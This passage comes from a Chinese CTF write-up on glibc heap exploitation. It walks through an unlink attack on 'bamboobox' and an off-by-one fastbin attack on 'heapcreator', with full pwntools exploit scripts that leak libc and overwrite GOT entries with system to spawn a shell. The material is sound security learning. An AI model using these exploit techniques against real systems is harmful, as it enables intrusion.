keyword">else</span>  <span class="token punctuation">{</span>    <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"No item in the box"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">}</span></code></pre><p>问题就出在change功能上<br>输入neme的长度的时候并没有判断是否大于之前的长度，造成了堆溢出漏洞</p><pre class=" language-c"><code class="language-c"><span class="token comment" spellcheck="true">//rmeove_item</span><span class="token keyword">if</span> <span class="token punctuation">(</span> num <span class="token punctuation">)</span>  <span class="token punctuation">{</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Please enter the index of item:"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">read</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>buf<span class="token punctuation">,</span> <span class="token number">8uLL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    v1 <span class="token operator">=</span> <span class="token function">atoi</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>buf<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token operator">*</span><span class="token punctuation">(</span>_QWORD <span class="token operator">*</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>itemlist<span class="token punctuation">[</span><span class="token number">4</span> <span class="token operator">*</span> v1 <span class="token operator">+</span> <span class="token number">2</span><span class="token punctuation">]</span> <span class="token punctuation">)</span>    <span class="token punctuation">{</span>      <span class="token function">free</span><span class="token punctuation">(</span><span class="token operator">*</span><span class="token punctuation">(</span><span class="token keyword">void</span> <span class="token operator">*</span><span class="token operator">*</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>itemlist<span class="token punctuation">[</span><span class="token number">4</span> <span class="token operator">*</span> v1 <span class="token operator">+</span> <span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token operator">*</span><span class="token punctuation">(</span>_QWORD <span class="token operator">*</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>itemlist<span class="token punctuation">[</span><span class="token number">4</span> <span class="token operator">*</span> v1 <span class="token operator">+</span> <span class="token number">2</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0LL</span><span class="token punctuation">;</span>      itemlist<span class="token punctuation">[</span><span class="token number">4</span> <span class="token operator">*</span> v1<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>      <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"remove successful!!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token operator">--</span>num<span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">else</span>    <span class="token punctuation">{</span>      <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"invaild index"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>  <span class="token punctuation">}</span>  <span class="token keyword">else</span>  <span class="token punctuation">{</span>    <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"No item in the box"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">}</span></code></pre><p>remove功能做的挺好的，该置null也都置null了</p><p>函数分析完了，接着就来构思如何利用<br>还是先封装一波函数</p><pre class=" language-python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">add</span><span class="token punctuation">(</span>length<span class="token punctuation">,</span> name<span class="token punctuation">)</span><span class="token punctuation">:</span>    io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">":"</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">"2"</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">":"</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>str<span class="token punctuation">(</span>length<span class="token punctuation">)</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">":"</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>name<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">change</span><span class="token punctuation">(</span>idx<span class="token punctuation">,</span> length<span class="token punctuation">,</span> name<span class="token punctuation">)</span><span class="token punctuation">:</span>    io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">":"</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">"3"</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">":"</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>str<span class="token punctuation">(</span>idx<span class="token punctuation">)</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">":"</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>str<span class="token punctuation">(</span>length<span class="token punctuation">)</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">":"</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>name<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">remove</span><span class="token punctuation">(</span>idx<span class="token punctuation">)</span><span class="token punctuation">:</span>    io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">":"</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">"4"</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">":"</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>str<span class="token punctuation">(</span>idx<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">show</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">":"</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">"1"</span><span class="token punctuation">)</span></code></pre><p>既然有严重的堆溢出漏洞，我们就可以任意构造堆，满足unlink的利用条件<br>先malloc三个chunk</p><pre class=" language-python"><code class="language-python">add<span class="token punctuation">(</span><span class="token number">0x40</span><span class="token punctuation">,</span><span class="token string">'a'</span><span class="token operator">*</span><span class="token number">8</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">#要用来溢出的chunk  chunk0</span>add<span class="token punctuation">(</span><span class="token number">0x80</span><span class="token punctuation">,</span><span class="token string">'b'</span><span class="token operator">*</span><span class="token number">8</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">#victim chunk      chunk1</span>add<span class="token punctuation">(</span><span class="token number">0x40</span><span class="token punctuation">,</span><span class="token string">'c'</span><span class="token operator">*</span><span class="token number">8</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">#防止上面的chunk free之后和top chunk合并  chunk2</span></code></pre><p>看一下此时的堆结构<br><img src="/LawlietLW.github.io/2020/02/24/dui-xue-xi-ji-lu/13.jpg" alt=""><br>接着我们开始构造fakechunk<br>我们的目的是溢出到chunk1的pre_size和size位，除去chunk0的header，我们至少要编辑0x40-0x10+0x10=0x40大小</p><pre class=" language-python"><code class="language-python">fake_chunk<span class="token operator">=</span>p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">#pre_size</span>fake_chunk<span class="token operator">+=</span>p64<span class="token punctuation">(</span><span class="token number">0x41</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">#size</span>fake_chunk<span class="token operator">+=</span>p64<span class="token punctuation">(</span>ptr<span class="token number">-0x18</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">#fd</span>fake_chunk<span class="token operator">+=</span>p64<span class="token punctuation">(</span>ptr<span class="token number">-0x10</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">#bk</span>fake_chunk<span class="token operator">+=</span><span class="token string">'A'</span><span class="token operator">*</span><span class="token number">0x20</span>fake_chunk<span class="token operator">+=</span>p64<span class="token punctuation">(</span><span class="token number">0x40</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">#fakechunk size</span>fake_chunk<span class="token operator">+=</span>p64<span class="token punctuation">(</span><span class="token number">0x90</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">#chunk1 size,并且标记fakechunk为空闲状态</span>change<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0x80</span><span class="token punctuation">,</span>fake_chunk<span class="token punctuation">)</span></code></pre><p>其中ptr=0x6020c8,即chunk0的指针的地址<br><img src="/LawlietLW.github.io/2020/02/24/dui-xue-xi-ji-lu/14.jpg" alt=""><br>我们的fakechunk已经构造好了</p><p>接下来就是unlink了，当我们free掉chunk1，系统会检测到fakechunk也是空闲状态，就会将它一并free，最终结果就是原本应该指向fakechunk的指针P指向了&amp;ptr-8的位置，我们查看一下<br><img src="/LawlietLW.github.io/2020/02/24/dui-xue-xi-ji-lu/15.jpg" alt=""><br>确实如我们预料一样，接下来我们编辑chunk0的话，其实是在编辑0x6020b0的内存<br>我们再来泄露libc基地址</p><pre class=" language-python"><code class="language-python">payload <span class="token operator">=</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token number">2</span>payload <span class="token operator">+=</span> p64<span class="token punctuation">(</span><span class="token number">0x40</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>elf<span class="token punctuation">.</span>got<span class="token punctuation">[</span><span class="token string">'atoi'</span><span class="token punctuation">]</span><span class="token punctuation">)</span>change<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0x80</span><span class="token punctuation">,</span>payload<span class="token punctuation">)</span></code></pre><p>我们看看change之前的0x6020b0处的内存<br><img src="/LawlietLW.github.io/2020/02/24/dui-xue-xi-ji-lu/17.jpg" alt=""><br>change之后的<br><img src="/LawlietLW.github.io/2020/02/24/dui-xue-xi-ji-lu/18.jpg" alt=""><br>如如上标注的，我们需要伪造chunk0，否则无法绕过检查<br>然后我们打印出chunk0的内容，即atoi的的地址，根据这个我们可以计算出libc基地址和system函数地址，接着，我们再次编辑chunk0，将<code>elf.got['atoi']</code>替换成<code>system@got</code>，这样一来，只要我们再输入一个<code>sh</code>，atoi(sh)就变成了system(sh),即可getshell<br>完整exp如下</p><pre class=" language-python"><code class="language-python"><span class="token comment" spellcheck="true">#!/usr/bin/env python</span><span class="token comment" spellcheck="true"># -*- coding: utf-8 -*-</span><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>io <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">'./bamboobox'</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">#io=remote("node3.buuoj.cn",28938)</span>elf<span class="token operator">=</span>ELF<span class="token punctuation">(</span><span class="token string">'bamboobox'</span><span class="token punctuation">)</span>context<span class="token punctuation">.</span>log_level <span class="token operator">=</span> <span class="token string">'debug'</span><span class="token keyword">def</span> <span class="token function">add</span><span class="token punctuation">(</span>length<span class="token punctuation">,</span> name<span class="token punctuation">)</span><span class="token punctuation">:</span>    io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">":"</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">"2"</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">":"</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>str<span class="token punctuation">(</span>length<span class="token punctuation">)</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">":"</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>name<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">change</span><span class="token punctuation">(</span>idx<span class="token punctuation">,</span> length<span class="token punctuation">,</span> name<span class="token punctuation">)</span><span class="token punctuation">:</span>    io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">":"</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">"3"</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">":"</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>str<span class="token punctuation">(</span>idx<span class="token punctuation">)</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">":"</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>str<span class="token punctuation">(</span>length<span class="token punctuation">)</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">":"</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>name<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">remove</span><span class="token punctuation">(</span>idx<span class="token punctuation">)</span><span class="token punctuation">:</span>    io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">":"</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">"4"</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">":"</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>str<span class="token punctuation">(</span>idx<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">show</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">":"</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">"1"</span><span class="token punctuation">)</span>ptr<span class="token operator">=</span><span class="token number">0x6020c8</span>add<span class="token punctuation">(</span><span class="token number">0x40</span><span class="token punctuation">,</span><span class="token string">'a'</span><span class="token operator">*</span><span class="token number">8</span><span class="token punctuation">)</span>add<span class="token punctuation">(</span><span class="token number">0x80</span><span class="token punctuation">,</span><span class="token string">'b'</span><span class="token operator">*</span><span class="token number">8</span><span class="token punctuation">)</span>add<span class="token punctuation">(</span><span class="token number">0x40</span><span class="token punctuation">,</span><span class="token string">'c'</span><span class="token operator">*</span><span class="token number">8</span><span class="token punctuation">)</span>fake_chunk<span class="token operator">=</span>p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">#pre_size</span>fake_chunk<span class="token operator">+=</span>p64<span class="token punctuation">(</span><span class="token number">0x41</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">#size</span>fake_chunk<span class="token operator">+=</span>p64<span class="token punctuation">(</span>ptr<span class="token number">-0x18</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">#fd</span>fake_chunk<span class="token operator">+=</span>p64<span class="token punctuation">(</span>ptr<span class="token number">-0x10</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">#bk</span>fake_chunk<span class="token operator">+=</span><span class="token string">'A'</span><span class="token operator">*</span><span class="token number">0x20</span>fake_chunk<span class="token operator">+=</span>p64<span class="token punctuation">(</span><span class="token number">0x40</span><span class="token punctuation">)</span>fake_chunk<span class="token operator">+=</span>p64<span class="token punctuation">(</span><span class="token number">0x90</span><span class="token punctuation">)</span>change<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0x80</span><span class="token punctuation">,</span>fake_chunk<span class="token punctuation">)</span>remove<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>payload <span class="token operator">=</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token number">2</span>payload <span class="token operator">+=</span> p64<span class="token punctuation">(</span><span class="token number">0x40</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>elf<span class="token punctuation">.</span>got<span class="token punctuation">[</span><span class="token string">'atoi'</span><span class="token punctuation">]</span><span class="token punctuation">)</span>change<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0x80</span><span class="token punctuation">,</span>payload<span class="token punctuation">)</span>gdb<span class="token punctuation">.</span>attach<span class="token punctuation">(</span>io<span class="token punctuation">)</span>show<span class="token punctuation">(</span><span class="token punctuation">)</span>io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"0 : "</span><span class="token punctuation">)</span>atoi <span class="token operator">=</span> u64<span class="token punctuation">(</span>io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">":"</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token number">6</span><span class="token punctuation">]</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span><span class="token string">"\x00"</span><span class="token punctuation">)</span><span class="token punctuation">)</span>libc <span class="token operator">=</span> atoi <span class="token operator">-</span> <span class="token number">0x36e80</span><span class="token keyword">print</span> <span class="token string">"libc:"</span><span class="token punctuation">,</span>hex<span class="token punctuation">(</span>libc<span class="token punctuation">)</span>system <span class="token operator">=</span> libc <span class="token operator">+</span> <span class="token number">0x45390</span>change<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0x8</span><span class="token punctuation">,</span>p64<span class="token punctuation">(</span>system<span class="token punctuation">)</span><span class="token punctuation">)</span>io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">":"</span><span class="token punctuation">)</span>io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">"sh"</span><span class="token punctuation">)</span>io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">'5'</span><span class="token punctuation">)</span>io<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre><h1 id="fastbin-attack"><a href="#fastbin-attack" class="headerlink" title="fastbin attack"></a>fastbin attack</h1><p>fastbin attack是利用fastbin分配原理的漏洞，要求有堆溢出漏洞，通常情况下与double free、use after free和chunk extend连用<br>详细的讲解可以看看<a href="https://blog.csdn.net/Breeze_CAT/article/details/103788698" target="_blank" rel="noopener">breezeO_o</a>师傅的文章，讲的很详细，我这里就记录一下我做的两道题</p><h2 id="heapcreator"><a href="#heapcreator" class="headerlink" title="heapcreator"></a>heapcreator</h2><p>checksec<br><img src="/LawlietLW.github.io/2020/02/24/dui-xue-xi-ji-lu/19.jpg" alt=""><br>64位文件，可以复写got表<br>运行一下<br><img src="/LawlietLW.github.io/2020/02/24/dui-xue-xi-ji-lu/20.jpg" alt=""><br>增删查改，没毛病<br>IDA分析<br><img src="/LawlietLW.github.io/2020/02/24/dui-xue-xi-ji-lu/21.jpg" alt=""><br>main函数利用switch选择功能<br><img src="/LawlietLW.github.io/2020/02/24/dui-xue-xi-ji-lu/22.jpg" alt=""><br>分析create功能<br>最大能创建十次<br>然后会先malloc一个0x10(实际为0x20)大小的chunk(称之为heap)，其指针存入heaparray数组中<br>接下来分配用户指定大小的chunk(content)，其size存入heap数据段的第一个八字节中(即fd位)，content的指针存入heap的第二个八字节当中(即bk位)<br>heap结构如下</p><pre class=" language-c"><code class="language-c"><span class="token keyword">struct</span> heap <span class="token punctuation">{</span>    size_t size <span class="token punctuation">;</span>    <span class="token keyword">char</span> <span class="token operator">*</span>content <span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token punctuation">;</span></code></pre><p><img src="/LawlietLW.github.io/2020/02/24/dui-xue-xi-ji-lu/23.jpg" alt=""><br>分析edit功能<br>根据index寻找chunk<br>如果存在则可以编辑<br>但读入content的时候存在off-by-one漏洞，如图所示<br><img src="/LawlietLW.github.io/2020/02/24/dui-xue-xi-ji-lu/24.jpg" alt=""><br>这导致我们可以修改下一个chunk的size位<br><img src="/LawlietLW.github.io/2020/02/24/dui-xue-xi-ji-lu/25.jpg" alt=""><br>分析show功能<br>同样根据index寻找chunk，如果对应的heaparray存在则输出size和content<br><img src="/LawlietLW.github.io/2020/02/24/dui-xue-xi-ji-lu/26.jpg" alt=""><br>最后分析delete功能<br>delete功能没有什么问题，free的同时将指针置0</p><p>根据上面的分析，程序存在的漏洞存在于edit<br>先锋装一下函数</p><pre class=" language-python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">create</span><span class="token punctuation">(</span>size<span class="token punctuation">,</span>content<span class="token punctuation">)</span><span class="token punctuation">:</span>    io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">":"</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>send<span class="token punctuation">(</span><span class="token string">"1"</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">":"</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>send<span class="token punctuation">(</span>str<span class="token punctuation">(</span>size<span class="token punctuation">)</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">":"</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>send<span class="token punctuation">(</span>content<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">edit</span><span class="token punctuation">(</span>idx<span class="token punctuation">,</span>content<span class="token punctuation">)</span><span class="token punctuation">:</span>    io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">":"</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>send<span class="token punctuation">(</span><span class="token string">"2"</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">":"</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>send<span class="token punctuation">(</span>str<span class="token punctuation">(</span>idx<span class="token punctuation">)</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">":"</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>send<span class="token punctuation">(</span>content<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">show</span><span class="token punctuation">(</span>idx<span class="token punctuation">)</span><span class="token punctuation">:</span>    io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">":"</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>send<span class="token punctuation">(</span><span class="token string">"3"</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">":"</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>send<span class="token punctuation">(</span>str<span class="token punctuation">(</span>idx<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">delete</span><span class="token punctuation">(</span>idx<span class="token punctuation">)</span><span class="token punctuation">:</span>    io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">":"</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>send<span class="token punctuation">(</span><span class="token string">"4"</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">":"</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>send<span class="token punctuation">(</span>str<span class="token punctuation">(</span>idx<span class="token punctuation">)</span><span class="token punctuation">)</span></code></pre><p>思考一下如何getshell，程序只开启了Partial RELRO，那么可以将free@got修改成system@got，再够造出一个内容为/bin/sh的chunk，将其free即可<br>那么我们先创建2个chunk(实际上一共创建了4个)</p><pre class=" language-python"><code class="language-python">create<span class="token punctuation">(</span><span class="token number">0x18</span><span class="token punctuation">,</span><span class="token string">'aaaa'</span><span class="token punctuation">)</span>create<span class="token punctuation">(</span><span class="token number">0x10</span><span class="token punctuation">,</span><span class="token string">'bbbb'</span><span class="token punctuation">)</span></code></pre><p>此时堆结构如下<br><img src="/LawlietLW.github.io/2020/02/24/dui-xue-xi-ji-lu/27.jpg" alt=""><br>我们将第一个content赋值为/bin/sh，并且通过溢出将下面两个chunk合并为一个</p><pre class=" language-python"><code class="language-python">edit<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token string">'/bin/sh\x00'</span><span class="token operator">+</span><span class="token string">'a'</span><span class="token operator">*</span><span class="token number">0x10</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0x41</span><span class="token punctuation">)</span><span class="token punctuation">)</span></code></pre><p>堆结构如下<br><img src="/LawlietLW.github.io/2020/02/24/dui-xue-xi-ji-lu/28.jpg" alt=""><br>可以看到我们成功的将heap[1]的大小修改成了heap[1]+content[1]<br>我们delete掉heap[1]，就将content一起free掉了，fastbin中就存在了一个0x20大小和0x40大小的chunk。之后我们再申请一个大小为0x30(实际为0x40)的chunk，首先会malloc一个0x20大小的chunk作为heap，这样原本作为old content[1]的chunk就被分配给了new heap[1],而分配给new content[1]的0x40大小的chunk则包含了old heap[1]+old content[1],也就是说，我们可以通过控制new content[1]来修改new heap[1]d的值。<br>于是我们将new heap[1]指向new content[1]的指针改为free@got，这样，当我们输出new content[1]时，就会去输出free在内存中的地址，从而泄露libc基地址</p><pre class=" language-python"><code class="language-python">edit<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token string">'/bin/sh\x00'</span><span class="token operator">+</span><span class="token string">'a'</span><span class="token operator">*</span><span class="token number">0x10</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0x41</span><span class="token punctuation">)</span><span class="token punctuation">)</span>delete<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>create<span class="token punctuation">(</span><span class="token number">0x30</span><span class="token punctuation">,</span>p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token number">4</span> <span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0x30</span><span class="token punctuation">)</span> <span class="token operator">+</span>  p64<span class="token punctuation">(</span>elf<span class="token punctuation">.</span>got<span class="token punctuation">[</span><span class="token string">'free'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span>show<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"Content : "</span><span class="token punctuation">)</span>data <span class="token operator">=</span> io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"Done !"</span><span class="token punctuation">)</span>free_addr <span class="token operator">=</span> u64<span class="token punctuation">(</span>data<span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token string">"\n"</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span><span class="token string">"\x00"</span><span class="token punctuation">)</span><span class="token punctuation">)</span>libc <span class="token operator">=</span> free_addr <span class="token operator">-</span> libc<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">'free'</span><span class="token punctuation">]</span> <span class="token keyword">print</span> <span class="token string">"libc:"</span><span class="token punctuation">,</span>hex<span class="token punctuation">(</span>libc<span class="token punctuation">)</span>system <span class="token operator">=</span> libc <span class="token operator">+</span> <span class="token number">0x45390</span></code></pre><p>此时堆结构如下<br><img src="/LawlietLW.github.io/2020/02/24/dui-xue-xi-ji-lu/29.jpg" alt=""></p><p>最后我们将free@got修改为system@got，再free掉content[0]即可getshell</p><pre class=" language-python"><code class="language-python">edit<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span>p64<span class="token punctuation">(</span>system<span class="token punctuation">)</span><span class="token punctuation">)</span>delete<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>io<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre><p>完整exp如下</p><pre class=" language-python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>context<span class="token punctuation">.</span>log_level<span class="token operator">=</span><span class="token string">"debug"</span>io<span class="token operator">=</span>process<span class="token punctuation">(</span><span class="token string">'./heapcreator'</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">#io=remote("node3.buuoj.cn",27942)</span>elf<span class="token operator">=</span>ELF<span class="token punctuation">(</span><span class="token string">'heapcreator'</span><span class="token punctuation">)</span>libc<span class="token operator">=</span>ELF<span class="token punctuation">(</span><span class="token string">'libc-2.23_x64.so'</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">create</span><span class="token punctuation">(</span>size<span class="token punctuation">,</span>content<span class="token punctuation">)</span><span class="token punctuation">:</span>    io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">":"</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>send<span class="token punctuation">(</span><span class="token string">"1"</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">":"</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>send<span class="token punctuation">(</span>str<span class="token punctuation">(</span>size<span class="token punctuation">)</span><span class="token punctuation">)</span>    